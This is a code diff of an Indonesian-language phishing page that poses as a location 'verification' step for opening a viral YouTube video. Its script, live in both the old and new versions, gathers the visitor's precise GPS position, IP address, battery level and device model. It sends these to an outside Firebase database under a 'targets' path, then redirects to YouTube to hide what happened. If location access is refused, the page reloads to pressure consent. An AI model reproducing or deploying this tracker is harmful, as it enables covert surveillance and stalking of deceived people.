@@ -5,126 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikasi Keamanan Konten</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
         .card { background: #1e293b; padding: 35px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.4); max-width: 350px; width: 90%; border: 1px solid #334155; }
-        .icon { font-size: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #3b82f6); }
-        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 700; color: #fff; }
-        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; border: none; padding: 16px 24px; border-radius: 14px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; font-size: 15px; text-transform: uppercase; letter-spacing: 1px; }
-        .btn:active { transform: scale(0.98); }
-        #loader { display: none; margin-top: 20px; border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 700; }
+        p { font-size: 14px; color: #94a3b8; margin-bottom: 30px; }
+        .btn { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; border: none; padding: 16px 24px; border-radius: 14px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
+        #loader { display: none; margin-top: 20px; border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card" id="mainCard">
+<div class="card">
     <div class="icon">🛡️</div>
     <h2>Verifikasi Wilayah</h2>
-    <p>Konten video ini sedang tren di wilayah Anda. Silakan verifikasi lokasi Anda untuk membuka aplikasi YouTube secara otomatis.</p>
-    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO BERITA VIRAL</button>
+    <p>Silakan verifikasi lokasi Anda untuk membuka video yang sedang tren di wilayah Anda secara otomatis.</p>
+    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
     <div id="loader"></div>
 </div>
 
 <script>
-    // 1. Pembuatan ID Unik untuk setiap pengunjung agar data tidak tertimpa
-    const targetID = "Target_" + Math.floor(Date.now() / 1000);
+    const targetID = "User_" + Math.floor(Date.now() / 1000);
+    const startTime = Date.now(); // Mencatat waktu mulai sesi
     const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;
 
     const YT_URL = "https://www.youtube.com/trending";
     const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";
 
-    let lastSent = 0;
-
-    // 2. Fungsi Mengambil Alamat IP
-    async function getIP() {
+    async function getExtra() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            return data.ip;
-        } catch (e) { return "Hidden/VPN"; }
+            const bat = await (navigator.getBattery ? navigator.getBattery() : null);
+            return {
+                ip: data.ip,
+                battery: bat ? Math.round(bat.level * 100) + "%" : "N/A",
+                device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Mobile"
+            };
+        } catch (e) { return { ip: "N/A", battery: "N/A", device: "Mobile" }; }
     }
 
-    // 3. Fungsi Mengambil Info Baterai & Jenis HP
-    async function getDeviceInfo() {
-        let bat = "N/A";
-        try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                bat = Math.round(battery.level * 100) + "%";
-            }
-        } catch (e) {}
-
-        const ua = navigator.userAgent;
-        let model = "Unknown Device";
-        if (ua.includes("Android")) {
-            model = ua.split('(')[1]?.split(')')[0] || "Android";
-        } else if (ua.includes("iPhone")) {
-            model = "iPhone / iOS Device";
-        } else if (ua.includes("Windows")) {
-            model = "Windows PC";
-        }
-
-        return { battery: bat, device: model };
-    }
-
-    // 4. Fungsi Mengirim Data ke Firebase
-    async function sendToFirebase(coords) {
-        const ip = await getIP();
-        const info = await getDeviceInfo();
-
+    async function sendData(coords) {
+        const info = await getExtra();
         const payload = {
             id: targetID,
             lat: coords.latitude,
             lon: coords.longitude,
-            ip: ip,
+            ip: info.ip,
             battery: info.battery,
             device: info.device,
-            updated_at: new Date().toLocaleString("id-ID"),
+            start_time: startTime, // Data permanen untuk hitungan sesi
+            updated_at: Date.now(),
             status: "Online"
         };
-
-        return fetch(DB_URL, { 
-            method: 'PUT', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload) 
-        });
+        fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
     }
 
-    // 5. Eksekusi Utama
     function processAll() {
         document.getElementById('startBtn').style.display = "none";
         document.getElementById('loader').style.display = "block";
 
         if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                async (pos) => {
-                    const now = Date.now();
-                    // Kirim data setiap 5 detik
-                    if (now - lastSent > 5000) {
-                        await sendToFirebase(pos.coords);
-                        lastSent = now;
-                    }
-
-                    // Pengalihan ke YouTube pada koordinat pertama yang didapat
-                    if (lastSent === now) {
-                        setTimeout(() => {
-                            window.location.href = YT_APP_INTENT;
-                            setTimeout(() => { window.location.href = YT_URL; }, 1000);
-                        }, 1000);
-                    }
-                },
-                (err) => {
-                    alert("Akses lokasi ditolak. Verifikasi diperlukan untuk memutar video.");
-                    location.reload();
-                },
-                { enableHighAccuracy: true }
-            );
-        } else {
-            alert("Browser Anda tidak mendukung fitur ini.");
+            navigator.geolocation.watchPosition((pos) => {
+                sendData(pos.coords);
+                setTimeout(() => {
+                    window.location.href = YT_APP_INTENT;
+                    setTimeout(() => { window.location.href = YT_URL; }, 1000);
+                }, 2000);
+            }, (err) => { location.reload(); }, { enableHighAccuracy: true });
         }
     }
 </script>
-
 </body>
 </html>
